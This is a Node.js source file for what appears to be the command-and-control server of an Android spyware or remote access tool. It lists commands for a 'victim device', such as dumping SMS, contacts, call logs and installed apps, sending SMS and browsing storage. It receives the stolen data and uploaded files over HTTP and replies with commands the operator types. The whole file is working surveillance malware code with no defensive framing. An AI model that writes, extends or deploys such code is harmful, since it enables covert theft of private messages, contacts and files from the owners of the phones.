const express=require("express"); //api module
const prom=require("prompt-sync"); //api module
const prompt=prom(); //for user input module
const nanospinner=require("nanospinner") //for make loading spinnger moulde
const app=express(); //use express function
const fs=require("fs"); //file maneger module
const bodyParser = require('body-parser');
const multer=require("multer");
//const cors = require('cors');

app.use(express.json());
//app.use(bodyParser.urlencoded({ extended: false }));
//app.use(bodyParser.json());
//console.log("\033[93mCommands : \033[94m\n(1) [torch on/off] \n(2) [send_sms,number,text] \n(3) [call number] \n(4) [dump_sms] \n(5) [InstalledApps] \n(6) [dump_contact] \n(7) [get_phone_logs]    get call logs \n(8) [device_info]\033[0m")

const commands={
  "torch on/off": "for control torch",
  "send_sms,<number>,<text>": "for send sms from victim device \nUSE: send_sms,+9122222222,this is me",
  "dump_sms": "dump sms NOTE: it dump only one sms",
  "dump_contact": "dump all contact from victim device",
  "get_phone_logs": "dump call logs from victim device",
  "device_info" : "information about victim device",
  "InstalledApps" : "list of installed app in victim device",
  "filse" : "Access storage",
  "cd <dir>" : "change dir to <dir>",
  "get_cd <dir> <count>" : "if you don't want to access only <count>",
  "import <path>":"can import image or files"
}
console.log("\n\nCommands : \n");
for (key in commands){
  console.log("\033[92m"+key+" -- \033[0m["+commands[key]+"]\n");
}
//set multer for receiving files
//here set disk to save and configer file
const disk=multer.diskStorage(
  {
    //set destination to save file
    destination:function(req,file,cb){
      cb(null,".",function (error,sucess){
        if(error){
          console.log(error);
        }
      })
    },
    //set file name to save
    filename:function(req,file,cb){
      cb(null,file.originalname,function(error,sucess){
        if(error){
          console.log(error);
        }
      })
    }
  }
)

const upload=multer({storage:disk})//now set configer dist 
// /img is path whare to upload imag image is name ling {image: filepath}
app.post("/img",upload.single("image"),(req,res,next)=>{
  res.send("done");
});
//end multer

//get req to check
app.get("/check",(req,res)=>{
  res.send("done")
})
// 
var listeningSpnner = nanospinner.createSpinner("listening port "+process.argv[2]); //make spinner which use listening as loading text NOTE: spinner not start now it's like object
app.post("/",(req,res)=>{
	//first condition
  //console.log(req.connection.remoteAddress);
 // console.log(req.connection.socket.remoteAddress);
  //console.log(req.socket.remoteAddress);
	if(req.body.data){ //check if req.body.data has some response then run this
     if(req.body.data=="Connected"){ //check if req.body.data has respone Connected then 
       listeningSpnner.success(); //spinner is done
   }else{ 
	  console.log("\033[92m"+req.body.data)
    }
	}//first condition end

  // 2 condition 
  else if(req.body.Info){ // check if req.body.data has some respone then NOTE:= it run when app give device info as response
		const DeviceInfo=JSON.parse(req.body.Info); //parse device info data to print on screen 
		for(key in DeviceInfo){
			console.log("\033[92m"+key+"\033[0m : "+DeviceInfo[key]+""); //print device info in console
		}
	}// 2 condition end
  
  // 3 conditon 
	else if(req.body.packages){ //it run when app send installed app name as response
		const fileName=prompt("FILE NAME TO SAVE LIST : ");//as for file to insert installed app name
		fs.writeFileSync(fileName,req.body.packages); //write file and append 
		console.log("SAVE TO : "+fileName);
	}// 3 condition end

  // 4 condition 
  else if(req.body.files){ // not done yet so no comments
    const files=req.body.files;
    const jsonfile=JSON.parse(files);
    const allkeys=Object.keys(jsonfile);
    for(const key in jsonfile){
      console.log("\033[92m"+jsonfile[key]);
    }
  }
	// 5 conditions
	else if(req.body.contact){ //it run when app give contacts in respone
		const file=prompt("FILE NAME TO SAVE : ");
		if(file==""){
			//
		}else{
			fs.writeFileSync(file,"")
			fs.appendFileSync(file,req.body.contact);
      //console.log("\033[0m"+req.body.contact);
			console.log("\033[92mSAVE TO \033[0m "+file);
		}
	}// 5 condition end

	//main response / commmand
	const response=prompt("\033[0m(\033[93m"+req.header('x-forwarded-for') +"\033[0m)\033[91m@\033[0m"+"\033[96mCommand \033[0m> ");
	res.status(200);
	res.send(response);//send response like dump_sms and etc.
});

var PORT=process.argv[2];

//console.log("\033[96mListening "+PORT)
app.listen(PORT,listeningSpnner.start()); //start listring and spinner
